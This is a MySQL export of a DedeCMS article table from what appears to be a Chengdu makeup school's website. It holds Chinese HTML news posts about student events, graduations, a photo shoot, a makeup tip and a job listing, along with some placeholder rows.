/*
Navicat MySQL Data Transfer

Source Server         : localhost_3306
Source Server Version : 50146
Source Host           : localhost:3306
Source Database       : qlschool_new

Target Server Type    : MYSQL
Target Server Version : 50146
File Encoding         : 65001

Date: 2015-05-26 10:24:46
*/

SET FOREIGN_KEY_CHECKS=0;
-- ----------------------------
-- Table structure for `dede_addonarticle`
-- ----------------------------
DROP TABLE IF EXISTS `dede_addonarticle`;
CREATE TABLE `dede_addonarticle` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_addonarticle
-- ----------------------------
INSERT INTO dede_addonarticle VALUES ('1', '16', '<br />\r\n<div>\r\n	<span style=\"font-size:26px;\"><span style=\"color:#000000;\">&nbsp; 2015年3月30日，群丽化妆老师带领同学们牵手F5.6摄影俱乐部的会员们共同打造了一次已民国为主题的历史文化摄影。</span></span><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150415/1-150415110430462.jpg\" /><br />\r\n	<span style=\"font-size:16px;\"><span style=\"color:#000000;\">&nbsp; <span style=\"font-size:26px;\">在整个化妆过程中全权由学员们独立完成。期间不但丰富了化妆操作技巧更与F5.6俱乐部成员在化妆过程中互相商讨。<br />\r\n	&nbsp;&nbsp;</span></span><img alt=\"\" src=\"/uploads/allimg/150415/1-15041511054BB.jpg\" /><br />\r\n	&nbsp;&nbsp;</span></div>\r\n<span style=\"color:#000000;\">&nbsp; </span><span style=\"font-size:26px;\"><span style=\"color:#000000;\">临近傍晚，一天的拍摄</span>下来。小编深深感觉到群丽化妆学员们的实践操作和在妆面的技巧上来讲已具火候。<br />\r\n&nbsp; 而F5.6俱乐部会员更已独具一格的拍摄水平及不同的拍摄技巧、构图、色彩搭配、迷离错影的光与影给大家创作出一副美轮美奂的大片。</span><br />\r\n&nbsp;&nbsp;<br />\r\n', '', '', '171.221.99.152');
INSERT INTO dede_addonarticle VALUES ('2', '17', '<span style=\"font-size:26px;\">&nbsp; 为了回馈对群丽化妆学校一路来的支持，2015年3月。<br />\r\n&nbsp; 群丽化妆学校于蓝光大厦五楼，开展了&ldquo;老学员答谢之美丽课堂&rdquo;讲座。<br />\r\n&nbsp; 群丽化妆学校建校位于1996年，9年陪伴中。秉承&ldquo;认真，负责&rdquo;态度。对社会输出高端人才，回馈于社会也认真对待每一位学员。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:26px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G5542Hb.jpg\" /></span></div>\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<span style=\"font-size:26px;\">&nbsp; 课堂中，群丽高级化妆师杨洁老师，在课堂中为了保证课堂的教学质量。<br />\r\n&nbsp; 在整个课堂5小时中每个细节和技巧都亲自为老学员耐心讲解与示范。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size: 26px;\">&nbsp;</span><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G55544631.JPG\" style=\"font-size: 26px;\" /><span style=\"font-size:26px;\">&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G55512127.JPG\" /></span></div>\r\n<span style=\"font-size:26px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G5560HC.JPG\" /></span><br />\r\n', '', '', '182.149.90.127');
INSERT INTO dede_addonarticle VALUES ('85', '18', '<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G61911M7.jpg\" /></div>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('10', '2', '专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程磊专业课程专业课程专业课程专业课程专业课程专业课程专业课程专业课程', '', '', '127.0.0.1');
INSERT INTO dede_addonarticle VALUES ('11', '12', '彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程<br />\r\n课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程', '', '', '171.221.99.152');
INSERT INTO dede_addonarticle VALUES ('37', '12', '彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程<br />\r\n课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程彩妆课程', '', '', '182.149.89.181');
INSERT INTO dede_addonarticle VALUES ('51', '18', '<p style=\"margin: 0px; padding: 0px; border: none; font-size: 15px; text-indent: 28px; max-width: 100%; clear: both; min-height: 1em; white-space: pre-wrap; color: rgb(62, 62, 62); font-family: \'Helvetica Neue\', Helvetica, \'Hiragino Sans GB\', \'Microsoft YaHei\', Î¢ÈíÑÅºÚ, Arial, sans-serif; line-height: 24px; box-sizing: border-box !important; word-wrap: break-word !important;\">\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 20px; max-width: 100%; color: rgb(247, 150, 70); box-sizing: border-box !important; word-wrap: break-word !important;\">撞色唇</span></p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 15px; text-indent: 28px; max-width: 100%; clear: both; min-height: 1em; white-space: pre-wrap; color: rgb(62, 62, 62); font-family: \'Helvetica Neue\', Helvetica, \'Hiragino Sans GB\', \'Microsoft YaHei\', Î¢ÈíÑÅºÚ, Arial, sans-serif; line-height: 24px; box-sizing: border-box !important; word-wrap: break-word !important;\">\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 18px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\">　双唇上涂抹少量润唇膏，先在双唇上涂抹少量润唇膏，不要选择油分过大的，以免影响妆容的持久性。用不同颜色的唇膏涂抹上下唇。最后用干净的棉签将唇形略微修整整齐，使唇部印象更加丰盈诱人。<br style=\"margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\" />\r\n	Step by step<br style=\"margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\" />\r\n	　　1.淡紫色撞薰衣草紫。<br style=\"margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\" />\r\n	　　2.淡粉色撞枚紫色。<br style=\"margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\" />\r\n	　　3.荧光橙色撞枚紫色。<br style=\"margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\" />\r\n	　　4.枚紫包含荧光橙。</span></p>\r\n<p style=\"margin: 0px; padding: 0px; border: none; font-size: 15px; text-indent: 28px; max-width: 100%; clear: both; min-height: 1em; white-space: pre-wrap; color: rgb(62, 62, 62); font-family: \'Helvetica Neue\', Helvetica, \'Hiragino Sans GB\', \'Microsoft YaHei\', Î¢ÈíÑÅºÚ, Arial, sans-serif; line-height: 24px; box-sizing: border-box !important; word-wrap: break-word !important; text-align: center;\">\r\n	<span style=\"margin: 0px; padding: 0px; border: none; font-size: 18px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;\"><img alt=\"\" src=\"/uploads/allimg/150416/1-150416105401424.jpg\" style=\"width: 661px; height: 377px;\" /></span></p>\r\n', '', '', '220.166.214.173');
INSERT INTO dede_addonarticle VALUES ('57', '17', '<span style=\"font-size:24px;\">&nbsp; 随着一首《蜀绣》让我们沉寂在美妙的旋律中。就如歌曲旋律那般由姹紫嫣红渐入流金铄石。<br />\r\n次日,由航空公司举办的职业妆面培训也在此拉下序幕。<br />\r\n&nbsp; 整个妆面培训活动中,航空公司邀请以&ldquo;时尚化妆教育&rdquo;为主方针的群丽化妆学校倾情为再坐乘务职业人员进行妆面的造型与修饰课程指导。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G4155W61.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<span style=\"font-size:24px;\">&nbsp; 同时作为有着多年的妆面经验的教育机构,更是由高级化妆、造型师朱老师带头结合际与理论为再坐人员进行细致与专注的讲解和示范。<br />\r\n&nbsp; 在整个培训活动中,朱老师为了呈现出完美的妆面效果更是拿出专注、认真、一丝不苟的职业态度为在在座人员耐心的讲解与示范。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41626351.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41A0Z1.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41K4117.jpg\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 八小时的培训过程中,航空乘务职员结合群丽化妆学校倡导的实践与理论在整个培训过程中呈现出火热的场面。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41RMR.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41U0P4.jpg\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G41939325.jpg\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 培训结束后,航空乘务人员依旧虚心的请教在实际过程中没有留意到的瑕疵,同时群丽化妆学校多年的教学理念已被学员、大型公司职员所认可。<br />\r\n&nbsp; 在未来的过程中,相信群丽化妆学校依然会结合大时代潮流与更加深层次的方向感落实并实用教学课程。</span><br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('68', '40', '<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">职位描述：</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">1、负责接待家长咨询，解答家长疑问；&nbsp;</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">2、完成家长报班、调班、退费及转班的相关系统操作；&nbsp;</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">3、完成各类讲义随材的收集、整理、立卷、装订、归档等保管工作；&nbsp;</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">4、检查听课证，协助老师维护课前、课中、课后的秩序；</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">5、工作热情主动，有一定亲和力，认可教育行业；</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">任职资格：</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">1、对办公室工作程序熟悉，熟练使用Word、Excel等办公软件；&nbsp;</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">2、具有良好的沟通能力、协调能力及承受能力；&nbsp;</span><br style=\"line-height: 28px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px\" />\r\n<span style=\"padding-bottom: 0px; line-height: 28px; margin: 0px; padding-left: 0px; padding-right: 0px; font-family: Arial, 宋体, simsun, sans-serif; color: rgb(75,75,75); font-size: 14.39px; padding-top: 0px\">3、能适应倒班。</span>', '', '', '220.166.209.159');
INSERT INTO dede_addonarticle VALUES ('69', '16', '&nbsp;<span style=\"font-size:24px;\"> <span style=\"color:#000000;\">今日已&ldquo;全城热恋，爱在绿洲&rdquo;为主题的大型婚纱秀模特化妆造型圆满落下帷幕。</span></span><span style=\"color: rgb(0, 0, 0); font-size: 24px;\">在本次婚纱模特秀中，群丽化妆学校老师带领学员参与其中并切实实践化妆与模特的造型。</span><br />\r\n<span style=\"font-size:24px;\"><span style=\"color:#000000;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G2011V91.jpg\" /><br />\r\n<br />\r\n&nbsp; <span style=\"font-family: 宋体; letter-spacing: 0pt;\">整个活动中，群丽学员热情奔发，已全新的妆面及造型为本次婚纱模特演绎了一次&ldquo;梦幻与美&rdquo;的唯美的整体造型。</span></span></span><br />\r\n<br />\r\n<div style=\"text-align: center;\">\r\n	&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G14409291.jpg\" style=\"width: 500px; height: 375px;\" /><br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G1443WP.jpg\" style=\"width: 500px; height: 375px;\" /></div>\r\n<br />\r\n<p class=\"p0\" style=\"margin-bottom:0pt; margin-top:0pt; \">\r\n	<span style=\"font-size:24px;\"><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-family: 宋体;\">&nbsp; 光彩朦胧的舞台设计、时尚感十足的</span><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-family: 宋体;\">LED字幕。</span></span><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-size: 14pt; font-family: 宋体;\"><span style=\"font-size:24px;\">焕发出新一代娇子们对青春洋溢之心的焕发。</span></span><br />\r\n	<br />\r\n	<br />\r\n	<span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-size: 14pt; font-family: 宋体;\"><o:p></o:p></span></p>\r\n<p class=\"p0\" style=\"margin-bottom:0pt; margin-top:0pt; \">\r\n	<span style=\"font-size:24px;\"><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-family: 宋体;\">&nbsp; 随着音乐的响起数位模特佳丽身披唯美梦幻豪华婚纱，向在场的诸位展示这一次婚纱《</span><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-family: 宋体;\">全城热恋，爱在绿洲</span></span><span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-size: 14pt; font-family: 宋体;\"><span style=\"font-size:24px;\">》的主题。<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G202221G.jpg\" /></span><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G14ZH52.jpg\" /><br />\r\n	<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G15023Y4.jpg\" /></span><br />\r\n	<br />\r\n	<span class=\"15\" style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; font-size: 14pt; font-family: 宋体;\"><o:p></o:p></span></p>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('70', '16', '<div>\r\n	<span style=\"color:#000000;\"><span style=\"font-size:24px;\">&nbsp; 精功眼镜成立于1989年。25年的历史中，精功眼镜目前已成为一家集生产、加工、验光、配镜、太阳镜、隐形眼镜等产品为一体的大型连锁企业。在同行中，精功率先通过了ISO国际质量体系认证，并荣获国家、省、市等各级政府的多项荣耀。<br />\r\n	<br />\r\n	&nbsp; 当天群丽化妆参与精功国际模特的化妆活动。<br />\r\n	&nbsp; 在活动中学员们积极参与其中并为模特画上那一抹美轮美奂的妆面并得到模特们的亲切认可。&nbsp;&nbsp;&nbsp;<br />\r\n	&nbsp; 同时也证明了群丽化妆多年的教学功底的成功与认可性。</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G25243F4.jpg\" /></span></div>\r\n<div>\r\n	<span style=\"color:#000000;\"><span style=\"font-size: 24px;\">&nbsp; 相信在未来里，群丽在化妆教育领域里会更对社会输出大量高端人才。</span></span></div>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('71', '16', '<div>\r\n	<span style=\"font-size:24px;\">&nbsp; Fanjeis新品发布会中，Fanjeis邀请了时尚界著名化妆师小P老师和江苏卫视主持人朱丹来蓉。</span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 在发布会中，小P老师更亲自示范和讲解新品的功效。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G3141DZ.jpg\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 同时作为成都化妆教育领域的群丽化妆学校，班主任郭老师更是带领学生热情参与Fanjeis新品发布会中。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G30U59D.png\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 活动期间，群丽化妆学校的同学，为了给模特呈现出最完美的一面，更是在活动前期倾心做好准备。</span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G31010J3.png\" /></span></div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 活动圆满结束后，学员对于此次收获更加不言而喻。能得到更加宏伟的化妆活动实践操作，还能得到时尚界小P老师的指导，是这次Fanjeis新品发布会尤为重要的环节。</span><br />\r\n	&nbsp;</div>\r\n<div>\r\n	<span style=\"font-size:24px;\">&nbsp; 群丽化妆学校视学员的实践能力为教学的生命线，注重理论与实践相结合。为了加强学员的实践能力，群丽学校与各大机构强强联手，提供学员更多更好的实践机会，以求学员更好地将理论运用于实践。几年来，群丽学员参与过与新潮合作电子杂志模特化妆、新潮两周年庆明星化妆、玛莎拉蒂成都站试乘体验、台湾李炳坤合唱团、话剧《剩女郎》《有多少爱可以胡来》、》新丝路模特大赛化妆全程赞助、西部车展模特儿化妆造型、群丽集团十周年大型庆典顶级礼服秀化妆造型、《家在成都》合作打造楼盘模特的化妆造型、精功模特大赛指定化妆造型以及成都商报、华西都市报、成都电视台等媒体活动化妆造型实践机会!</span></div>\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('72', '16', '<p class=\"p0\" style=\"margin-bottom:0pt; margin-top:0pt; \">\r\n	<span style=\"font-family:arial,helvetica,sans-serif;\"><span style=\"font-size:24px;\"><span style=\"color: rgb(51, 51, 51); letter-spacing: 0pt; background-image: initial; background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: initial; background-repeat: initial;\">&nbsp; 得利始建于1924年，专业经营中外名牌钟表眼镜，是目前山东省同行业规模的钟表眼镜连锁企业。现拥有24家专业连锁店，一个配送中心，一个钟表维修中心。</span><br />\r\n	<span style=\"color: rgb(51, 51, 51); letter-spacing: 0pt;\">&nbsp; 群丽化妆学校特此受邀为其员工讲解专业彩妆知识。在讲解过程中其耐心与专业的彩妆知识得到了其员工的认可。</span></span></span></p>\r\n<p class=\"p0\" style=\"margin-bottom: 0pt; margin-top: 0pt; text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G32151191.jpg\" style=\"width: 500px; height: 332px;\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G322103K.jpg\" style=\"width: 500px; height: 332px;\" /><br />\r\n	<br />\r\n	&nbsp;</p>\r\n<p class=\"p0\" style=\"margin-bottom:0pt; margin-top:0pt; \">\r\n	<span style=\"font-size:24px;\"><span style=\"color: rgb(51, 51, 51); font-family: 宋体; letter-spacing: 0pt;\">&nbsp;&nbsp;</span></span><span style=\"font-family:arial,helvetica,sans-serif;\"><span style=\"font-size: 24px;\">成都群丽化妆学校经过多年的沉淀，教学经验丰富，在化妆、美容。美甲、美发方面更开拓出了自身独有的教学方式及理念。在整个教学过程中采用&ldquo;理论&rdquo;与&ldquo;实践&rdquo;相结合。同时在教学规划上聘请国内知名时尚业授课导师，奉承让每位学员在理论中结合实践，从而提高专业的实质升华。<br />\r\n	&nbsp; &nbsp;</span><span style=\"font-size:24px;\"><span style=\"color: rgb(51, 51, 51); letter-spacing: 0pt;\">期间化妆老师亲自在讲台上邀请职员进行示范和容易忽略的小瑕疵讲解。</span></span></span></p>\r\n<p class=\"p0\" style=\"margin-bottom: 0pt; margin-top: 0pt; text-align: center;\">\r\n	<span style=\"font-size:24px;\"><span style=\"color: rgb(51, 51, 51); font-family: 宋体; letter-spacing: 0pt;\">&nbsp;</span></span><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G32351637.jpg\" style=\"color: rgb(51, 51, 51); font-family: 宋体; font-size: 24px;\" /><span style=\"color: rgb(51, 51, 51); font-family: 宋体; letter-spacing: 0pt; font-size: 24px;\">&nbsp;&nbsp;</span><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G3232JX.jpg\" style=\"color: rgb(51, 51, 51); font-family: 宋体; letter-spacing: 0pt; font-size: 24px; width: 500px; height: 332px;\" />、<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G3242Q61.jpg\" /></p>\r\n<br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('73', '16', '<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G60600910.jpg\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 今天是200期化妆学员毕业的日子。<br />\r\n&nbsp; 同时化妆班班主任及学校负责人共同参加学员的毕业典礼及留影纪念中。<br />\r\n&nbsp; 培训期间是快乐的，在学校的时光长廊里，学员之间的友谊之情，师生之间的浓浓之情也要在此暂别一下。<br />\r\n&nbsp; 同时也祝福200期学员在未来的职业道路中神采奕奕，努力向上，去开创更加美好的明天。<br />\r\n&nbsp;</span><br />\r\n&nbsp;<br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('74', '16', '<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp; <img alt=\"\" src=\"/uploads/allimg/150417/1-15041G60356430.jpg\" style=\"width: 1022px; height: 681px;\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 绿树成荫，万物蓬生。带着即将炽热的气息的季节，群丽化妆学校迎来了201期学员的毕业时光。<br />\r\n&nbsp; 当天201期班主任及学校负责人带领那群伶俐乖巧、活灵活现的乖乖学员们合影留念中。<br />\r\n&nbsp; 天下没有不散的宴席，短暂的告别只是学员们暂时一别。<br />\r\n&nbsp; 祝这些聪明伶俐的学员们在未来里、鹏程万里、蓬勃向上。</span><br />\r\n', '', '', '222.211.124.86');
INSERT INTO dede_addonarticle VALUES ('81', '17', '<span style=\"font-size:24px;\">&nbsp; 近日，被誉为韩国性感女神蔡妍（이채연이채연）现身于成都群丽婚纱化妆摄影，受邀为高洗护品牌-香珂拍摄时尚广告。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G43554215.jpg\" style=\"width: 640px; height: 1136px;\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G4362b38.jpg\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G43HUc.jpg\" /></span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 蔡妍（이채연이채연）出身于韩国首尔，获得过U1traCats新人奖、SBS最佳上镜奖、SBS<br />\r\n人气歌谣奖、SBS首尔时尚中心宣传大使、中韩慈善大使。<br />\r\n&nbsp; 群丽成建于1996年，现已跻身于成都时尚艺术之都。<br />\r\n&nbsp; 作为婚纱摄影单位，群丽摄影每年都为时尚艺术界创作出别具一格的作品。并坚持以唯美、高端、潮流为主导。<br />\r\n&nbsp; 同时作为化妆学校，9年教学实践经验积攒，每年为社会输出高端数名人才，回馈于社会，报答于社会。<br />\r\n&nbsp; 整个拍摄过程为了保证拍摄质量。摄影团队与化妆团队很早就开始了准备。争取为大家呈现出美轮美奂的时尚大片。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G43Z13U.jpg\" /></span><br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	&nbsp;</div>\r\n<span style=\"font-size:24px;\">&nbsp; 10小时拍摄过程中，蔡妍（이채연이채연）更拿出专业态度，每个细节都力求做到完美。</span>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G44040914.jpg\" /><br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G4421a41.JPG\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\"><img alt=\"\" src=\"/uploads/allimg/150417/1-15041G44241N4.JPG\" style=\"width: 1022px; height: 1363px;\" /></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:24px;\">&nbsp;<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G44420934.JPG\" style=\"width: 1022px; height: 1363px;\" /> </span></div>\r\n<span style=\"font-size:24px;\">&nbsp; 中场休息时，蔡妍（이채연이채연）更面对微笑与同伴们一起自拍，做鬼脸。并且对每位工作人员都十分亲切。<br />\r\n&nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150417/1-15041G44544318.JPG\" style=\"width: 1022px; height: 690px;\" /><br />\r\n&nbsp; 临近傍晚，蔡妍与群丽摄影化妆高管们合影留念。<br />\r\n&nbsp;<br />\r\n&nbsp;</span><br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;', '', '', '222.211.124.86');
